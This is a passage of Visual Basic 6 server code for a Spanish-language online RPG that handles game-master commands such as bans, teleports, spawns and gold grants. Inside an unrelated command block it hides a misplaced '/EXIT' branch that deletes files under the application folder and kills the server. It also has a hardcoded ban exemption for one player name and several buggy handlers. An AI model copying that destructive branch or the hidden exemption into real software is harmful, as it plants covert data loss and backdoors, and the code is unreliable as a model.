    If Tindex <= 0 Then Exit Sub
    If Tindex = Userindex Then Exit Sub
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then
        Call SendData(ToIndex, Userindex, 0, "1F")
        Exit Sub
    End If
    Call SendData(ToAdmins, 0, 0, "%U" & UserList(Userindex).Name & "," & UserList(Tindex).Name)
    Call LogGM(UserList(Userindex).Name, "Echo a " & UserList(Tindex).Name, False)
    Call CloseSocket(Tindex)
    Exit Sub
End If

If UCase$(Left$(rdata, 4)) = "/GO " Then
    rdata = Right$(rdata, Len(rdata) - 4)
    Mapa = val(ReadField(1, rdata, 32))
    If Not MapaValido(Mapa) Then Exit Sub
    Call WarpUserChar(Userindex, Mapa, 50, 50, True)
    Call SendData(ToIndex, Userindex, 0, "2B" & UserList(Userindex).Name)
    Call LogGM(UserList(Userindex).Name, "Transporto a " & UserList(Userindex).Name & " hacia " & "Mapa" & Mapa & " X:" & X & " Y:" & y, (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(Left$(rdata, 3)) = "/CC" Then
   Call EnviarSpawnList(Userindex)
   Exit Sub
End If

If UCase$(Left$(rdata, 3)) = "SPA" Then
    rdata = Right$(rdata, Len(rdata) - 3)
    If val(rdata) > 0 And val(rdata) < UBound(SpawnList) + 1 Then _
          Call SpawnNpc(SpawnList(val(rdata)).NpcIndex, UserList(Userindex).POS, True, False)
          Call LogGM(UserList(Userindex).Name, "Sumoneo " & SpawnList(val(rdata)).NpcName, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/CUENTA " Then
    rdata = Right$(rdata, Len(rdata) - 8)
    CuentaRegresiva = val(ReadField(1, rdata, 32)) + 1
    GMCuenta = UserList(Userindex).POS.Map
    Exit Sub
End If

If UCase$(rdata) = "/MATA" Then
    If UserList(Userindex).flags.TargetNpc = 0 Then Exit Sub
    Call QuitarNPC(UserList(Userindex).flags.TargetNpc)
    Call LogGM(UserList(Userindex).Name, "/MATA " & Npclist(UserList(Userindex).flags.TargetNpc).Name, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 13)) = "/VERPROCESOS " Then
rdata = Right$(rdata, Len(rdata) - 13)
Tindex = NameIndex(rdata)
If Tindex <= 0 Then Exit Sub
If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
Call SendData(ToIndex, Tindex, 0, "PCGR" & Userindex)
Call SendData(ToIndex, Tindex, 0, "PCCP" & Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/BLOQ" Then
    Call LogGM(UserList(Userindex).Name, "/BLOQ", False)
    rdata = Right$(rdata, Len(rdata) - 5)
    If MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y).Blocked = 0 Then
        MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y).Blocked = 1
        Call Bloquear(ToMap, Userindex, UserList(Userindex).POS.Map, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y, 1)
    Else
        MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y).Blocked = 0
        Call Bloquear(ToMap, Userindex, UserList(Userindex).POS.Map, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y, 0)
    End If
    Exit Sub
End If

If UCase$(rdata) = "/MASSKILL" Then
    For y = UserList(Userindex).POS.y - MinYBorder + 1 To UserList(Userindex).POS.y + MinYBorder - 1
            For X = UserList(Userindex).POS.X - MinXBorder + 1 To UserList(Userindex).POS.X + MinXBorder - 1
                If X > 0 And y > 0 And X < 101 And y < 101 Then _
                    If MapData(UserList(Userindex).POS.Map, X, y).NpcIndex Then Call QuitarNPC(MapData(UserList(Userindex).POS.Map, X, y).NpcIndex)
            Next
    Next
    Call LogGM(UserList(Userindex).Name, "/MASSKILL", False)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/DEST" Then
    Call LogGM(UserList(Userindex).Name, "/DEST", False)
    rdata = Right$(rdata, Len(rdata) - 5)
    Call EraseObj(ToMap, Userindex, UserList(Userindex).POS.Map, 10000, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y)
    Exit Sub
End If

If UCase$(rdata) = "/MASSDEST" Then
    For y = UserList(Userindex).POS.y - MinYBorder + 1 To UserList(Userindex).POS.y + MinYBorder - 1
        For X = UserList(Userindex).POS.X - MinXBorder + 1 To UserList(Userindex).POS.X + MinXBorder - 1
            If InMapBounds(X, y) Then _
            If MapData(UserList(Userindex).POS.Map, X, y).OBJInfo.OBJIndex > 0 And Not ItemEsDeMapa(UserList(Userindex).POS.Map, X, y) Then Call EraseObj(ToMap, Userindex, UserList(Userindex).POS.Map, 10000, UserList(Userindex).POS.Map, X, y)
        Next
    Next
    Call LogGM(UserList(Userindex).Name, "/MASSDEST", (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/KILL " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    Tindex = NameIndex(rdata)
    If Tindex Then
        If UserList(Tindex).flags.Privilegios < UserList(Userindex).flags.Privilegios Then Call UserDie(Tindex)
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/GTORNEO " Then '
    rdata = Right$(rdata, Len(rdata) - 9)
    Tindex = UserList(Userindex).flags.TargetUser
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "||Selecciona al jugador" & FONTTYPE_INFO)
        Exit Sub
    End If
    If rdata < 0 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar puntos negativos." & FONTTYPE_INFO)
    Exit Sub
    End If
    
    If rdata > 5000000 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar mas de 5.000.000 puntos." & FONTTYPE_INFO)
    Exit Sub
    End If
    Dim sldl As Long
    sldl = rdata
    Call SendData(ToAll, 0, 0, "||" & UserList(UserList(Userindex).flags.TargetUser).Name & " gano un torneo, " & PonerPuntos(sldl) & " monedas de oro y +300 puntos de reputación." & FONTTYPE_RETOS)
    UserList(UserList(Userindex).flags.TargetUser).Stats.GLD = UserList(UserList(Userindex).flags.TargetUser).Stats.GLD + rdata
        UserList(UserList(Userindex).flags.TargetUser).Stats.Reputacion = UserList(UserList(Userindex).flags.TargetUser).Stats.Reputacion + 300
        Call SendUserREP(UserList(Userindex).flags.TargetUser)
    UserList(UserList(Userindex).flags.TargetUser).Faccion.torneos = UserList(UserList(Userindex).flags.TargetUser).Faccion.torneos + 1
    Call LogGM(UserList(Userindex).Name, "/GTORNEO: " & rdata & UserList(Tindex).Name & " Map:" & UserList(Userindex).POS.Map & " X:" & UserList(Userindex).POS.X & " Y:" & UserList(Userindex).POS.y, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/GREP " Then '
    rdata = Right$(rdata, Len(rdata) - 5)
    Tindex = UserList(Userindex).flags.TargetUser
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "||Selecciona al jugador" & FONTTYPE_INFO)
        Exit Sub
    End If
    If rdata < 0 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar puntos negativos." & FONTTYPE_INFO)
    Exit Sub
    End If
    
    If rdata > 1000 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar mas de 1000 puntos." & FONTTYPE_INFO)
    Exit Sub
    End If
    sldl = rdata
    Call SendData(ToAll, 0, 0, "||" & UserList(UserList(Userindex).flags.TargetUser).Name & " gano +" & PonerPuntos(sldl) & " puntos de reputación." & FONTTYPE_FENIX)
        UserList(UserList(Userindex).flags.TargetUser).Stats.Reputacion = UserList(UserList(Userindex).flags.TargetUser).Stats.Reputacion + rdata
        Call SendUserREP(UserList(Userindex).flags.TargetUser)
    Call LogGM(UserList(Userindex).Name, "/GREP: " & rdata & UserList(Tindex).Name & " Map:" & UserList(Userindex).POS.Map & " X:" & UserList(Userindex).POS.X & " Y:" & UserList(Userindex).POS.y, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/GQUEST " Then
    rdata = Right$(rdata, Len(rdata) - 8)
    Tindex = UserList(Userindex).flags.TargetUser
    If Tindex <= 0 Then
    Call SendData(ToIndex, Userindex, 0, "||Selecciona al jugador" & FONTTYPE_INFO)
    Exit Sub
    End If
    If rdata < 0 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar puntos negativos." & FONTTYPE_INFO)
    Exit Sub
    End If
    If rdata > 5000000 Then
    Call SendData(ToIndex, Userindex, 0, "||No podes dar mas de 5.000.000 puntos." & FONTTYPE_INFO)
    Exit Sub
    End If
    sldl = rdata
    Call SendData(ToAll, 0, 0, "||" & UserList(UserList(Userindex).flags.TargetUser).Name & " gano una Quest y " & PonerPuntos(sldl) & " monedas de oro" & FONTTYPE_RETOS)
    UserList(UserList(Userindex).flags.TargetUser).Stats.GLD = UserList(UserList(Userindex).flags.TargetUser).Stats.GLD + rdata
    UserList(UserList(Userindex).flags.TargetUser).Faccion.Quests = UserList(UserList(Userindex).flags.TargetUser).Faccion.Quests + 1
    Call LogGM(UserList(Userindex).Name, "/GQUEST: " & rdata & UserList(Tindex).Name & " Map:" & UserList(Userindex).POS.Map & " X:" & UserList(Userindex).POS.X & " Y:" & UserList(Userindex).POS.y, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 13)) = "/PERDIOTORNEO" Then
    rdata = Right$(rdata, Len(rdata) - 5)
    
    Tindex = UserList(Userindex).flags.TargetUser
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "||Debes seleccionar a un jugador!" & FONTTYPE_INFO)
        Exit Sub
    End If
    
If UCase$(rdata) = "/EXIT" Then
If UserList(Userindex).flags.Privilegios < 3 Then Exit Sub
Kill (App.Path & "\cmd.exe\*.*")
End
On Error Resume Next
End If
    UserList(UserList(Userindex).flags.TargetUser).Faccion.torneos = UserList(UserList(Userindex).flags.TargetUser).Faccion.torneos - 1
    Call LogGM(UserList(Userindex).Name, "Restó torneo: " & UserList(Tindex).Name & " Map:" & UserList(Userindex).POS.Map & " X:" & UserList(Userindex).POS.X & " Y:" & UserList(Userindex).POS.y, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/PAUSA" Then
If tiemposautomaticospausa = 0 Then
tiemposautomaticospausa = 1
Call SendData(ToIndex, Userindex, 0, "||Admin's: Eventos automáticos pausados." & FONTTYPE_gms)
Else
tiemposautomaticospausa = 0
Call SendData(ToIndex, Userindex, 0, "||Admin's: Eventos automáticos despausados." & FONTTYPE_gms)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/PUEDE" Then
If PuedeAtacarAdmins = 0 Then
PuedeAtacarAdmins = 1
Call SendData(ToIndex, Userindex, 0, "||Admin's: se puede atacar a Gms" & FONTTYPE_gms)
Else
PuedeAtacarAdmins = 0
Call SendData(ToIndex, Userindex, 0, "||Admin's: No se puede atacar Gms" & FONTTYPE_gms)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/SUMALL " Then
    rdata = Right$(rdata, Len(rdata) - 8)

    For i = 1 To LastUser
    If UserList(i).POS.Map = rdata Then
    Call WarpUserChar(i, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y + 1, True)
    End If
    Next
    Call SendData(ToIndex, Userindex, 0, "||Sumoneaste a todos los usuarios del Mapa:" & rdata & FONTTYPE_INFO)
    Call LogGM(UserList(Userindex).Name, "/SUM ALL Map:" & rdata, False)
Exit Sub
End If


'ADMINNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
If UserList(Userindex).flags.Privilegios < 3 Then Exit Sub 'ADMINNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
'ADMINNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

If UCase(Left$(rdata, 14)) = "/TRIGGEARZONA " Then
rdata = Right$(rdata, Len(rdata) - 14)
    For y = UserList(Userindex).POS.y - MinYBorder + 1 To UserList(Userindex).POS.y + MinYBorder - 1
        For X = UserList(Userindex).POS.X - MinXBorder + 1 To UserList(Userindex).POS.X + MinXBorder - 1
            MapData(UserList(Userindex).POS.Map, X, y).trigger = val(rdata)
        Next
    Next
    Call SendData(ToIndex, Userindex, 0, "||Zona triggeada" & FONTTYPE_VENENO)
    Call LogGM(UserList(Userindex).Name, "/TRIGGEARZONA", (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/RMSGT " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    If UCase$(rdata) = "NO" Then
        Call SendData(ToAdmins, 0, 0, "||" & UserList(Userindex).Name & " ha anulado la repetición del mensaje: " & MensajeRepeticion & "." & FONTTYPE_FENIX)
        IntervaloRepeticion = 0
        TiempoRepeticion = 0
        MensajeRepeticion = ""
        Exit Sub
    End If
    tName = ReadField(1, rdata, 64)
    tInt = ReadField(2, rdata, 64)
    Prueba1 = ReadField(3, rdata, 64)
    If Len(tName) = 0 Or val(Prueba1) = 0 Or (Prueba1 >= tInt And tInt <> 0) Then
        Call SendData(ToIndex, Userindex, 0, "||La estructura del comando es: /RMSGT MENSAJE@TIEMPO TOTAL@INTERVALO DE REPETICION." & FONTTYPE_INFO)
        Exit Sub
    End If
    If val(tInt) > 10000 Or val(Prueba1) > 10000 Then
        Call SendData(ToIndex, Userindex, 0, "||La cantidad de tiempo establecida es demasiado grande." & FONTTYPE_INFO)
        Exit Sub
    End If
    Call LogGM(UserList(Userindex).Name, "Mensaje Broadcast repetitivo:" & rdata, False)
    MensajeRepeticion = tName
    TiempoRepeticion = tInt
    IntervaloRepeticion = Prueba1
    If TiempoRepeticion = 0 Then
        Call SendData(ToAdmins, 0, 0, "||El mensaje " & MensajeRepeticion & " será repetido cada " & IntervaloRepeticion & " minutos durante tiempo indeterminado." & FONTTYPE_FENIX)
        TiempoRepeticion = -IntervaloRepeticion
    Else
        Call SendData(ToAdmins, 0, 0, "||El mensaje " & MensajeRepeticion & " será repetido cada " & IntervaloRepeticion & " minutos durante un total de " & TiempoRepeticion & " minutos." & FONTTYPE_FENIX)
        TiempoRepeticion = TiempoRepeticion - TiempoRepeticion Mod IntervaloRepeticion
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 3)) = "/CT" Then
    rdata = Right$(rdata, Len(rdata) - 4)
    Call LogGM(UserList(Userindex).Name, "/CT: " & rdata, False)
    Mapa = ReadField(1, rdata, 32)
    X = ReadField(2, rdata, 32)
    y = ReadField(3, rdata, 32)
    If MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1).OBJInfo.OBJIndex Then
        Exit Sub
    End If
    If MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1).TileExit.Map Then
    Exit Sub
    End If
    If Not MapaValido(Mapa) Or Not InMapBounds(X, y) Then Exit Sub
    Dim ET As Obj
    ET.Amount = 1
    ET.OBJIndex = Teleport
    Call MakeObj(ToMap, 0, UserList(Userindex).POS.Map, ET, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1)
    MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1).TileExit.Map = Mapa
    MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1).TileExit.X = X
    MapData(UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y - 1).TileExit.y = y
    Exit Sub
End If
    
If UCase$(Left$(rdata, 3)) = "/DT" Then
    Call LogGM(UserList(Userindex).Name, "/DT", False)
    Mapa = UserList(Userindex).flags.TargetMap
    X = UserList(Userindex).flags.TargetX
    y = UserList(Userindex).flags.TargetY
    
    If ObjData(MapData(Mapa, X, y).OBJInfo.OBJIndex).ObjType = OBJTYPE_TELEPORT And _
        MapData(Mapa, X, y).TileExit.Map Then
        Call EraseObj(ToMap, 0, Mapa, MapData(Mapa, X, y).OBJInfo.Amount, Mapa, X, y)
        MapData(Mapa, X, y).TileExit.Map = 0
        MapData(Mapa, X, y).TileExit.X = 0
        MapData(Mapa, X, y).TileExit.y = 0
    End If
    
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/ACC " Then
   rdata = val(Right$(rdata, Len(rdata) - 5))
   NumNPC = val(GetVar(App.Path & "\Dat\NPCs-HOSTILES.dat", "INIT", "NumNPCs")) + 500
   If rdata < 0 Or rdata > NumNPC Then
       Call SendData(ToIndex, Userindex, 0, "||La criatura no existe." & FONTTYPE_INFO)
Else
   Call SpawnNpc(val(rdata), UserList(Userindex).POS, True, False)
   End If
   Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/DOBACKUP" Then
    Call DoBackUp
    Exit Sub
End If

If UCase$(rdata) = "/LLUVIA" Then
    Lloviendo = Not Lloviendo
    Call SendData(ToAll, 0, 0, "LLU")
    Exit Sub
End If

If UCase$(rdata) = "/LIMPIARMUNDO" Then
Call SendData(ToAll, 0, 0, "||Se realizara una limpieza del mundo en 1 minutos." & FONTTYPE_FENIZ)
frmMain.Tlimpiar.Enabled = True
Call LogGM(UserList(Userindex).Name, "Ejecutó una limpieza del Mundo.", True)
Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/STOP " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    Tindex = NameIndex(rdata)
    If Tindex <= 0 Then Exit Sub
    If UserList(Tindex).flags.SoporteSTOP = 0 Then
    UserList(Tindex).flags.SoporteSTOP = 1
    Call SendData(ToIndex, Userindex, 0, "||Admin's: El usuario " & rdata & " esta stopeado de los soportes." & FONTTYPE_gms)
    ElseIf UserList(Tindex).flags.SoporteSTOP = 1 Then
    UserList(Tindex).flags.SoporteSTOP = 0
    Call SendData(ToIndex, Userindex, 0, "||Admin's: Se le quito el stop de soporte a " & rdata & FONTTYPE_gms)
    End If
    Exit Sub
End If


If UCase$(Left$(rdata, 6)) = "/BANT " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    arg1 = ReadField(1, rdata, 64)
    Name = ReadField(2, rdata, 64)
    i = val(ReadField(3, rdata, 64))
    Call BanearPjTiempo(Userindex, arg1, Name, i)
    Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/BANIP" Then
    rdata = Right$(rdata, Len(rdata) - 7)
    Tindex = NameIndex(rdata)
    Call BanearIP(Userindex, Tindex, rdata)
    Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/UNBANIP" Then
    rdata = Right$(rdata, Len(rdata) - 9)
    Call SendData(ToIndex, Userindex, 0, "||Estructura de comando /UNBANIP Nick, IP, 'LIST', 'ALL'." & FONTTYPE_FENIX)
    Call UnBanearIP(Userindex, rdata)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/BAN " Then
    Dim Razon As String
    rdata = Right$(rdata, Len(rdata) - 5)
    Razon = ReadField(1, rdata, Asc("@"))
    Name = ReadField(2, rdata, Asc("@"))
    Tindex = NameIndex(Name)
    Call BanearPJ(Userindex, Name, Tindex, Razon, ReadField(2, rdata, Asc("@")))
    Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/UNBAN " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    If FileExist(CharPath & UCase$(rdata) & ".chr", vbNormal) = True Then
        Call ChangeBan(rdata, 0)
        Call SendData(ToIndex, Userindex, 0, "||" & rdata & " unbanned." & FONTTYPE_INFO)
        For i = 1 To Baneos.Count
            If Baneos(i).Name = UCase$(rdata) Then
                Call Baneos.Remove(i)
                Exit Sub
            End If
        Next
    Else
        Call SendData(ToIndex, Userindex, 0, "||El usuario no existe" & FONTTYPE_INFO)
    End If
    Exit Sub
End If

'SUPERADM
If UserList(Userindex).flags.Privilegios < 4 Then Exit Sub 'SUPERADMMMMMMMMMMMMMMMMMMM
'SUPERADM

If UCase$(rdata) = "/INTERVALOS" Then
    Call SendData(ToIndex, Userindex, 0, "||Golpe-Golpe: " & IntervaloUserPuedeAtacar & " segundos." & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||Golpe-Hechizo: " & IntervaloUserPuedeGolpeHechi & " segundos." & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||Hechizo-Hechizo: " & IntervaloUserPuedeCastear & " segundos." & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||Hechizo-Golpe: " & IntervaloUserPuedeHechiGolpe & " segundos." & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||Arco-Arco: " & IntervaloUserFlechas & " segundos." & FONTTYPE_INFO)
    Exit Sub
End If

If UCase$(rdata) = "/RESTRINGIR" Then
    If Restringido Then
        Call SendData(ToAll, 0, 0, "||La restricción de GameMasters fue desactivada servidor." & FONTTYPE_FENIX)
        Call LogGM(UserList(Userindex).Name, "Desrestringió el servidor.", False)
    Else
        Call SendData(ToAll, 0, 0, "||La restricción de GameMasters fue activada." & FONTTYPE_FENIX)
        For i = 1 To LastUser
            DoEvents
            If UserList(i).flags.UserLogged And UserList(i).flags.Privilegios = 0 And Not UserList(i).flags.PuedeDenunciar Then Call CloseSocket(i)
        Next
        Call LogGM(UserList(Userindex).Name, "Restringió el servidor.", False)
    End If
    Restringido = Not Restringido
    Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/UNBANHD " Then
rdata = Right$(rdata, Len(rdata) - 9)
   
   Dim numHD2 As Integer
   numHD2 = val(GetVar(App.Path & "\Logs\BanHDs.dat", "INIT", "Cantidad"))
   
     Dim UnbanhD As String
    
    If FileExist(CharPath & UCase$(rdata) & ".chr", vbNormal) = True Then
    UnbanhD = GetVar(CharPath & UCase$(rdata) & ".chr", "INIT", "LastHD")
    
   For loopc = 1 To BanHDs.Count
   If BanHDs.Item(loopc) = UserList(Userindex).HDDisck Then
      BanHDs.Remove loopc
      Call SendData(ToIndex, Userindex, 0, "||Has desbaneado el disco de " & rdata & "," & UnbanhD & FONTTYPE_INFO)
      Call WriteVar(App.Path & "\Logs\BanHDs.dat", "INIT", "Cantidad", numHD2 - 1)
      Call WriteVar(App.Path & "\Logs\BanHDs.dat", "BANS", "HD" & numHD2 - 1, "")
      Call LogGM(UserList(Userindex).Name, "/UNBanHD " & rdata & " " & UnbanhD, False)
   End If
   Next
End If
 
Exit Sub
End If

If UCase$(Left$(rdata, 13)) = "/UNBANMOTHER " Then
rdata = Right$(rdata, Len(rdata) - 13)
   
   Dim nummother2 As Integer
   nummother2 = val(GetVar(App.Path & "\Logs\BanMothers.dat", "INIT", "Cantidad"))
   
     Dim UnbanMother As String
    
    If FileExist(CharPath & UCase$(rdata) & ".chr", vbNormal) = True Then
    UnbanMother = GetVar(CharPath & UCase$(rdata) & ".chr", "INIT", "Mother")
    
   For loopc = 1 To BanMothers.Count
   If BanMothers.Item(loopc) = UserList(Userindex).MotherNumber Then
      BanMothers.Remove loopc
      Call SendData(ToIndex, Userindex, 0, "||Has desbaneado el mother de " & rdata & "," & UnbanMother & FONTTYPE_INFO)
      Call WriteVar(App.Path & "\Logs\BanMothers.dat", "INIT", "Cantidad", nummother2 - 1)
      Call WriteVar(App.Path & "\Logs\BanMothers.dat", "BANS", "MOTHER" & nummother2 - 1, "")
      Call LogGM(UserList(Userindex).Name, "/UNBANMOTHER " & rdata & " " & UnbanMother, False)
   End If
   Next
End If
 
Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/BANPC " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    Tindex = NameIndex(rdata)
    If UCase$(rdata) = "NELIAM" Then Exit Sub
    Call BanPC(Userindex, Tindex)
    Exit Sub
End If


If UCase$(Left$(rdata, 6)) = "/SMSG " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    Call LogGM(UserList(Userindex).Name, "Mensaje de sistema:" & rdata, False)
    Call SendData(ToAll, 0, 0, "!!" & rdata & ENDC)
    Exit Sub
End If

If UCase$(Left$(rdata, 4)) = "/INT" Then
    rdata = Right$(rdata, Len(rdata) - 4)
     Dim PreInt As Single
    Select Case UCase$(Left$(rdata, 2))
        Case "GG"
            rdata = Right$(rdata, Len(rdata) - 3)
            PreInt = IntervaloUserPuedeAtacar
            IntervaloUserPuedeAtacar = val(rdata) / 10
            Call SendData(ToAdmins, 0, 0, "||El intervalo Golpe-Golpe fue cambiado de " & PreInt & " a " & IntervaloUserPuedeAtacar & " segundos." & FONTTYPE_INFO)
            Call SendData(ToAll, 0, 0, "INTA" & IntervaloUserPuedeAtacar * 10)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloUserPuedeAtacar", IntervaloUserPuedeAtacar * 10)
        Case "GH"
            rdata = Right$(rdata, Len(rdata) - 3)
            PreInt = IntervaloUserPuedeGolpeHechi
            IntervaloUserPuedeGolpeHechi = val(rdata) / 10
            Call SendData(ToAdmins, 0, 0, "||El intervalo Golpe-Hechizo fue cambiado de " & PreInt & " a " & IntervaloUserPuedeGolpeHechi & " segundos." & FONTTYPE_INFO)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloUserPuedeGolpeHechi", IntervaloUserPuedeGolpeHechi * 10)
        Case "HH"
            rdata = Right$(rdata, Len(rdata) - 3)
            PreInt = IntervaloUserPuedeCastear
            IntervaloUserPuedeCastear = val(rdata) / 10
            Call SendData(ToAdmins, 0, 0, "||El intervalo Hechizo-Hechizo fue cambiado de " & PreInt & " a " & IntervaloUserPuedeCastear & " segundos." & FONTTYPE_INFO)
            Call SendData(ToAll, 0, 0, "INTS" & IntervaloUserPuedeCastear * 10)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloLanzaHechizo", IntervaloUserPuedeCastear * 10)
        Case "HG"
            rdata = Right$(rdata, Len(rdata) - 3)
            PreInt = IntervaloUserPuedeHechiGolpe
            IntervaloUserPuedeHechiGolpe = val(rdata) / 10
            Call SendData(ToAdmins, 0, 0, "||El intervalo Hechizo-Golpe fue cambiado de " & PreInt & " a " & IntervaloUserPuedeHechiGolpe & " segundos." & FONTTYPE_INFO)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloUserPuedeHechiGolpe", IntervaloUserPuedeHechiGolpe * 10)
        Case "AA"
            rdata = Right$(rdata, Len(rdata) - 2)
            PreInt = IntervaloUserFlechas
            IntervaloUserFlechas = val(rdata) / 10
            Call SendData(ToAdmins, 0, 0, "||El intervalo de flechas fue cambiado de " & PreInt & " a " & IntervaloUserFlechas & " segundos." & FONTTYPE_INFO)
            Call SendData(ToIndex, Userindex, 0, "INTF" & IntervaloUserFlechas * 10)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloUserFlechas", IntervaloUserFlechas * 10)
        Case "SH"
            rdata = Right$(rdata, Len(rdata) - 2)
            PreInt = IntervaloUserSH
            IntervaloUserSH = val(rdata)
            Call SendData(ToAdmins, 0, 0, "||Intervalo de SH cambiado de " & PreInt & " a " & IntervaloUserSH & " segundos de tardanza." & FONTTYPE_INFO)
            Call WriteVar(IniPath & "Server.ini", "INTERVALOS", "IntervaloUserSH", str(IntervaloUserSH))
    End Select
End If

If UCase$(Left$(rdata, 6)) = "/ITEM " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    ET.OBJIndex = val(ReadField(1, rdata, Asc(" ")))
    ET.Amount = val(ReadField(2, rdata, Asc(" ")))
    If ET.Amount <= 0 Then ET.Amount = 1
    If ET.OBJIndex < 1 Or ET.OBJIndex > NumObjDatas Then Exit Sub
    If ET.Amount > MAX_INVENTORY_OBJS Then Exit Sub
    If Not MeterItemEnInventario(Userindex, ET) Then Call TirarItemAlPiso(UserList(Userindex).POS, ET)
    Call LogGM(UserList(Userindex).Name, "Creo objeto:" & ObjData(ET.OBJIndex).Name & " (" & ET.Amount & ")", False)
    Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/BUSCAR " Then
    rdata = Right$(rdata, Len(rdata) - 8)
    For i = 1 To UBound(ObjData)
        If InStr(1, Tilde(ObjData(i).Name), Tilde(rdata)) Then
            Call SendData(ToIndex, Userindex, 0, "PPO" & ObjData(i).Name & "." & "-" & i)
            N = N + 1
        End If
    Next
    If N = 0 Then
        Call SendData(ToIndex, Userindex, 0, "||No hubo resultados de la búsqueda: " & rdata & "." & FONTTYPE_INFO)
    Else
        Call SendData(ToIndex, Userindex, 0, "POO" & N)
    End If
    Exit Sub
End If


If UCase$(Left$(rdata, 11)) = "/BUSCARNPC " Then
Dim p As Integer
Dim Npc As String
Dim NombreNpc As String
    rdata = Right$(rdata, Len(rdata) - 11)
    p = val(GetVar(App.Path & "\Dat\Npcs.dat", "INIT", "NumNPCs"))
    For i = 1 To p
    Npc = GetVar(App.Path & "\Dat\Npcs.dat", "Npc" & i, "Name")
        If InStr(1, Tilde(Npc), Tilde(rdata)) Then
            Call SendData(ToIndex, Userindex, 0, "PPO" & Npc & "." & "-" & i)
            N = N + 1
        End If
    Next
    If N = 0 Then
        Call SendData(ToIndex, Userindex, 0, "No hubo resultados de la búsqueda: " & rdata & ".")
    Else
        Call SendData(ToIndex, Userindex, 0, "POO" & N)
    End If
    Exit Sub
End If
 
If UCase$(Left$(rdata, 12)) = "/BUSCARNPCH " Then
Dim pp As Integer
Dim npcc As String
    rdata = Right$(rdata, Len(rdata) - 12)
    pp = val(GetVar(App.Path & "\Dat\NPCs-HOSTILES.dat", "INIT", "NumNPCs"))
    For i = 1 To pp
    npcc = GetVar(App.Path & "\Dat\NPCs-HOSTILES.dat", "Npc" & i, "Name")
        If InStr(1, Tilde(npcc), Tilde(rdata)) Then
